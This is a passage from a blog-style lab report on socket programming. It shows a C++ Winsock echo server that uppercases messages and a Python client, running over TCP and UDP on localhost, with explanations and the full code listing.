&lt;&lt; <span class="hljs-string">&quot;Failed to accept client&quot;</span> &lt;&lt; std::endl;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br>std::cout &lt;&lt; <span class="hljs-string">&quot;Client connected&quot;</span> &lt;&lt; std::endl;<br></code></pre></td></tr></table></figure><p>UDP does not support accept, so we will exit the program if theprotocol is UDP.</p><p>if the protocol is TCP, we will accept a connection with the accept()system call, the second parameter is the address of the client, thethird parameter is the length of the address of the client.</p><h5 id="send-and-receive-data.">1.5. Send and receive data.</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>-&gt;protocol_ == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">if</span> (::<span class="hljs-built_in">send</span>(<span class="hljs-keyword">this</span>-&gt;client_fd_, message, <span class="hljs-built_in">strlen</span>(message), <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;Failed to send message&quot;</span> &lt;&lt; std::endl;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>-&gt;protocol_ == <span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sendto</span>(<span class="hljs-keyword">this</span>-&gt;server_fd_, message, <span class="hljs-built_in">strlen</span>(message), <span class="hljs-number">0</span>, (<span class="hljs-keyword">struct</span> sockaddr *) &amp;<span class="hljs-keyword">this</span>-&gt;client_addr_, <span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">this</span>-&gt;client_addr_)) &lt; <span class="hljs-number">0</span>) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;Failed to send message&quot;</span> &lt;&lt; std::endl;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>if the protocol is TCP, we will use send() to send the message to theclient.</p><p>if the protocol is UDP, we will use sendto() to send the message tothe client.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">memset</span>(<span class="hljs-keyword">this</span>-&gt;buffer_, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">this</span>-&gt;buffer_));<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>-&gt;protocol_ == <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">recv</span>(<span class="hljs-keyword">this</span>-&gt;client_fd_, <span class="hljs-keyword">this</span>-&gt;buffer_, <span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">this</span>-&gt;buffer_), <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;Failed to receive message&quot;</span> &lt;&lt; std::endl;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>-&gt;protocol_ == <span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">recvfrom</span>(<span class="hljs-keyword">this</span>-&gt;server_fd_, <span class="hljs-keyword">this</span>-&gt;buffer_, <span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">this</span>-&gt;buffer_), <span class="hljs-number">0</span>, (<span class="hljs-keyword">struct</span> sockaddr *) &amp;<span class="hljs-keyword">this</span>-&gt;client_addr_, &amp;<span class="hljs-keyword">this</span>-&gt;client_addr_len_) &lt; <span class="hljs-number">0</span>) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;Failed to receive message&quot;</span> &lt;&lt; std::endl;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">this</span>-&gt;buffer_size_ = <span class="hljs-built_in">strlen</span>(<span class="hljs-keyword">this</span>-&gt;buffer_);<br><span class="hljs-keyword">return</span> buffer_size_;<br></code></pre></td></tr></table></figure><p>if the protocol is TCP, we will use recv() to receive the messagefrom the client.</p><p>if the protocol is UDP, we will use recvfrom() to receive the messagefrom the client.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">char</span>* <span class="hljs-title">Server::GetBuffer</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>-&gt;buffer_;<br>&#125;<br></code></pre></td></tr></table></figure><p>we will return the buffer pointer to the client for stringprocessing.</p><h5 id="close-the-connection.">1.6. Close the connection.</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Server::Close</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">closesocket</span>(<span class="hljs-keyword">this</span>-&gt;client_fd_);<br>    <span class="hljs-built_in">closesocket</span>(<span class="hljs-keyword">this</span>-&gt;server_fd_);<br>    <span class="hljs-built_in">WSACleanup</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>Just close the client_fd and server_fd, and cleanup the WSA.</p><h4 id="main-function">~ main function</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;winsock2.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;server.h&quot;</span></span><br><br><span class="hljs-type">int</span> protocol = <span class="hljs-number">1</span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Lowercase2Uppercase</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; str[i] != <span class="hljs-string">&#x27;\0&#x27;</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (str[i] &gt;= <span class="hljs-string">&#x27;a&#x27;</span> &amp;&amp; str[i] &lt;= <span class="hljs-string">&#x27;z&#x27;</span>) &#123;<br>            str[i] -= <span class="hljs-number">32</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-function">Server <span class="hljs-title">server</span><span class="hljs-params">(<span class="hljs-number">8080</span>, protocol)</span></span>;<br>    server.<span class="hljs-built_in">Start</span>();<br>    <span class="hljs-type">int</span> msg_size = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>        <span class="hljs-keyword">if</span>(protocol == <span class="hljs-number">0</span>)&#123;<br>            server.<span class="hljs-built_in">Accept</span>();<br>        &#125;<br>        msg_size = server.<span class="hljs-built_in">Receive</span>();<br>        <span class="hljs-keyword">if</span>(msg_size)&#123;<br>            <span class="hljs-keyword">if</span>(server.<span class="hljs-built_in">GetBuffer</span>()[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;q&#x27;</span> &amp;&amp; server.<span class="hljs-built_in">GetBuffer</span>()[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;\0&#x27;</span>)&#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            std::cout &lt;&lt; <span class="hljs-string">&quot;Client: &quot;</span> &lt;&lt; server.<span class="hljs-built_in">GetBuffer</span>() &lt;&lt; std::endl;<br>            <span class="hljs-built_in">Lowercase2Uppercase</span>(server.<span class="hljs-built_in">GetBuffer</span>());<br>            server.<span class="hljs-built_in">Send</span>(server.<span class="hljs-built_in">GetBuffer</span>());<br>            std::cout &lt;&lt; <span class="hljs-string">&quot;Server: &quot;</span> &lt;&lt; server.<span class="hljs-built_in">GetBuffer</span>() &lt;&lt; std::endl;<br>        &#125;<br>    &#125;<br>    server.<span class="hljs-built_in">Close</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>we create a server object with the port and protocol we choose, thenstart the server.</p><p>then we use a while loop to receive the message from the client, ifthe message is 'q', we will break the loop.</p><p>if the message is not 'q', we will print the message from the client,convert the lowercase letters to uppercase letters, send the message tothe client, and print the message from the server.</p><p>finally, we close the server.</p><h4 id="client-side">2.Client side</h4><p>We have just finished the server side with c++, now we will start theclient side with python.</p><h5 id="create-a-socket-with-the-socket-system-call.-1">2.1. Create asocket with the socket() system call.</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># protocol = socket.SOCK_STREAM # TCP</span><br>protocol = socket.SOCK_DGRAM <span class="hljs-comment"># UDP</span><br>server = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span><br>port = <span class="hljs-number">8080</span><br><br>s = socket.socket(socket.AF_INET, protocol)<br><span class="hljs-keyword">if</span> protocol == socket.SOCK_STREAM:<br>    s.connect((server, port))<br></code></pre></td></tr></table></figure><p>we can choose the protocol of the socket, socket.SOCK_STREAM meansTCP, socket.SOCK_DGRAM means UDP.</p><p>Then we create a socket with the socket() system call, the firstparameter is the family of the socket, the second parameter is theprotocol of the socket.</p><p>if the protocol is TCP, we will connect to the server with theconnect() system call.</p><h5 id="send-and-receive-data.-1">2.2. Send and receive data.</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>message = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Enter your message: &#x27;</span>)<br><span class="hljs-keyword">if</span> protocol == socket.SOCK_DGRAM:<br>    s.sendto(message.encode(), (server, port))<br>    <span class="hljs-keyword">if</span> message == <span class="hljs-string">&#x27;q&#x27;</span>:<br>        <span class="hljs-keyword">break</span><br>    response, addr = s.recvfrom(<span class="hljs-number">1024</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;server: &#x27;</span>+response.decode())<br>    <span class="hljs-keyword">continue</span><br>s.send(message.encode())<br><span class="hljs-keyword">if</span> message == <span class="hljs-string">&#x27;q&#x27;</span>:<br>    <span class="hljs-keyword">break</span><br>response = s.recv(<span class="hljs-number">1024</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;server: &#x27;</span>+response.decode())<br></code></pre></td></tr></table></figure><p>if the protocol is UDP, we will use sendto() to send the message tothe server, and use recvfrom() to receive the message from theserver.</p><p>if the protocol is TCP, we will use send() to send the message to theserver, and use recv() to receive the message from the server.</p><h5 id="close-the-connection.-1">2.3. Close the connection.</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">s.close()<br></code></pre></td></tr></table></figure><p>Just close the socket.</p><h3 id="d.-results-and-analysis">D. Results and Analysis</h3><h4 id="tcp">1. TCP</h4><h5 id="server-side-1">1.1. Server side</h5><figure><img src="/img/experiment-of-socket/server.png" alt="server" /><figcaption aria-hidden="true">server</figcaption></figure><h5 id="client-side-1">1.2. Client side</h5><figure><img src="/img/experiment-of-socket/client.png" alt="client" /><figcaption aria-hidden="true">client</figcaption></figure><h4 id="udp">2. UDP</h4><h5 id="server-side-2">2.1. Server side</h5><figure><img src="/img/experiment-of-socket/server-udp.png" alt="server-udp" /><figcaption aria-hidden="true">server-udp</figcaption></figure><h5 id="client-side-2">2.2. Client side</h5><figure><img src="/img/experiment-of-socket/client-udp.png" alt="client-udp" /><figcaption aria-hidden="true">client-udp</figcaption></figure><h3 id="e.-conclusion">E. Conclusion</h3><p>In this experiment, we have realized the communication between theserver and the client with socket programming.</p><p>We have used TCP and UDP respectively, and the results show that thecommunication is successful.</p><h3 id="f.-code">F. Code</h3><p>you can find the code <ahref="https://github.com/symcreg/experiment_socket">here</a>.</p><p>or the code is as follows:</p><h4 id="server.h">server.h</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Created by symc on 2024/11/21.</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> NET_SOCKET_SERVER_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NET_SOCKET_SERVER_H</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;winsock2.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;ws2_32.lib&quot;</span>)</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-type">int</span> protocol_;<br>    <span class="hljs-type">int</span> port_; <span class="hljs-comment">// server port_</span><br>    <span class="hljs-type">int</span> server_fd_; <span class="hljs-comment">// server file descriptor</span><br>    <span class="hljs-type">int</span> client_fd_; <span class="hljs-comment">// client file descriptor</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sockaddr_in</span> server_addr_;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sockaddr_in</span> client_addr_;<br>    <span class="hljs-type">int</span> client_addr_len_;<br>    <span class="hljs-type">char</span> buffer_[<span class="hljs-number">1024</span>];<br>    <span class="hljs-type">int</span> buffer_size_ = <span class="hljs-number">1024</span>;<br><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">Server</span>(<span class="hljs-type">int</span> port = <span class="hljs-number">8080</span>, <span class="hljs-type">int</span> protocal = <span class="hljs-number">0</span>);<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Start</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Accept</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Send</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *message)</span></span>;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Receive</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-type">char</span>* <span class="hljs-title">GetBuffer</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Close</span><span class="hljs-params">()</span></span>;<br>    ~<span class="hljs-built_in">Server</span>()&#123;<br>        <span class="hljs-built_in">Close</span>();<br>    &#125;<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">//NET_SOCKET_SERVER_H</span></span><br></code></pre></td></tr></table></figure><h4 id="server.cpp">server.cpp</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Created by symc on 2024/11/21.</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;server.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;winsock2.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;ws2_32.lib&quot;</span>)</span><br><br><br>Server::<span class="hljs-built_in">Server</span>(<span class="hljs-type">int</span> port, <span class="hljs-type">int</span> protocal) &#123;<br>    <span class="hljs-keyword">this</span>-&gt;protocol_ = protocal;<br>    WORD version = <span class="hljs-built_in">MAKEWORD</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>);<br>    WSADATA data;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">WSAStartup</span>(version, &amp;data) != <span class="hljs-number">0</span>) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;Failed to start WSA&quot;</span> &lt;&lt; std::endl;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">this</span>-&gt;port_ = port;<br>    <span class="hljs-comment">//protocol: 0 means TCP, 1 means UDP</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>-&gt;protocol_ == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">this</span>-&gt;server_fd_ = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>-&gt;protocol_ == <span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">this</span>-&gt;server_fd_ = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>-&gt;server_fd_ == <span class="hljs-number">-1</span>) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;Failed to create socket&quot;</span> &lt;&lt; std::endl;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">this</span>-&gt;server_addr_.sin_family = AF_INET; <span class="hljs-comment">//sin means socket internet</span><br>    <span class="hljs-keyword">this</span>-&gt;server_addr_.sin_addr.s_addr = INADDR_ANY;<br>    <span class="hljs-keyword">this</span>-&gt;server_addr_.sin_port = <span class="hljs-built_in">htons</span>(<span class="hljs-keyword">this</span>-&gt;port_);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">bind</span>(<span class="hljs-keyword">this</span>-&gt;server_fd_, (<span class="hljs-keyword">struct</span> sockaddr *) &amp;<span class="hljs-keyword">this</span>-&gt;server_addr_, <span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">this</span>-&gt;server_addr_)) &lt; <span class="hljs-number">0</span>) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;Failed to bind socket&quot;</span> &lt;&lt; std::endl;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">this</span>-&gt;client_addr_len_ = <span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">this</span>-&gt;client_addr_);<br><br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Server::Start</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>-&gt;protocol_ == <span class="hljs-number">0</span>) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[TCP]&quot;</span> &lt;&lt; std::endl;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">listen</span>(<span class="hljs-keyword">this</span>-&gt;server_fd_, <span class="hljs-number">10</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            std::cerr &lt;&lt; <span class="hljs-string">&quot;Failed to listen&quot;</span> &lt;&lt; std::endl;<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>-&gt;protocol_ == <span class="hljs-number">1</span>)&#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[UDP]&quot;</span> &lt;&lt; std::endl;<br>    &#125;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Server started on port &quot;</span> &lt;&lt; <span class="hljs-keyword">this</span>-&gt;port_ &lt;&lt; std::endl;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Server::Accept</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>-&gt;protocol_ == <span class="hljs-number">1</span>)&#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;UDP does not support accept&quot;</span> &lt;&lt; std::endl;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">this</span>-&gt;client_fd_ = ::<span class="hljs-built_in">accept</span>(<span class="hljs-keyword">this</span>-&gt;server_fd_, (<span class="hljs-keyword">struct</span> sockaddr *) &amp;<span class="hljs-keyword">this</span>-&gt;client_addr_, &amp;<span class="hljs-keyword">this</span>-&gt;client_addr_len_);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>-&gt;client_fd_ &lt; <span class="hljs-number">0</span>) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;Failed to accept client&quot;</span> &lt;&lt; std::endl;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Client connected&quot;</span> &lt;&lt; std::endl;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Server::Send</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *message)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>-&gt;protocol_ == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (::<span class="hljs-built_in">send</span>(<span class="hljs-keyword">this</span>-&gt;client_fd_, message, <span class="hljs-built_in">strlen</span>(message), <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            std::cerr &lt;&lt; <span class="hljs-string">&quot;Failed to send message&quot;</span> &lt;&lt; std::endl;<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>-&gt;protocol_ == <span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sendto</span>(<span class="hljs-keyword">this</span>-&gt;server_fd_, message, <span class="hljs-built_in">strlen</span>(message), <span class="hljs-number">0</span>, (<span class="hljs-keyword">struct</span> sockaddr *) &amp;<span class="hljs-keyword">this</span>-&gt;client_addr_, <span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">this</span>-&gt;client_addr_)) &lt; <span class="hljs-number">0</span>) &#123;<br>            std::cerr &lt;&lt; <span class="hljs-string">&quot;Failed to send message&quot;</span> &lt;&lt; std::endl;<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Server::Receive</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">memset</span>(<span class="hljs-keyword">this</span>-&gt;buffer_, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">this</span>-&gt;buffer_));<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>-&gt;protocol_ == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">recv</span>(<span class="hljs-keyword">this</span>-&gt;client_fd_, <span class="hljs-keyword">this</span>-&gt;buffer_, <span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">this</span>-&gt;buffer_), <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            std::cerr &lt;&lt; <span class="hljs-string">&quot;Failed to receive message&quot;</span> &lt;&lt; std::endl;<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>-&gt;protocol_ == <span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">recvfrom</span>(<span class="hljs-keyword">this</span>-&gt;server_fd_, <span class="hljs-keyword">this</span>-&gt;buffer_, <span 